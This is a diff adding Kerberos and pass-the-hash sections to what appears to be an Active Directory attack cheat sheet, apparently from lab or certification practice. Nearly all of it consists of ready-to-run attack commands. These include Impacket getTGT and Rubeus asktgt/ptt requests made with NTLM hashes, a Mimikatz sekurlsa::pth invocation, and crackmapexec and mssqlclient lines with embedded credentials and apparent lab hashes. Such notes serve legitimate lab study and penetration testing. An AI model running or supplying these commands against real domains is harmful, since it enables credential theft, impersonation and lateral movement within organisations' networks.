@@ -55,3 +55,22 @@ proxychains -q crackmapexec smb 172.16.184.150-172.16.184.155 -u Administrator -
 ```
 python examples/mssqlclient.py will:123456@172.16.184.151 -port 1433 -windows-auth
 ```
+
+### Kerberos
+```
+# Ask TGT using Impacket
+proxychains -q python examples/getTGT.py tricky.com/sqlsvc -dc-ip 172.16.184.150 -hashes :1ef8ec7a4e862ed968d4d335afb77215
+KRB5CCNAME=sqlsvc.ccache
+
+# Ask TGT using Rubeus
+.\Rubeus.exe asktgt /user:administrator /domain:infinity.com /rc4:5f9163ca3b673adfff2828f368ca3760 /ptt
+# Load Kerberos ticket:
+Rubeus.exe ptt /ticket:base64
+```
+
+### Pass the Hash
+```
+# Using Mimikatz
+privilege::debug
+sekurlsa::pth /user:sqlsvc /domain:tricky.com /ntlm:1ef8ec7a4e862ed968d4d335afb77215
+```
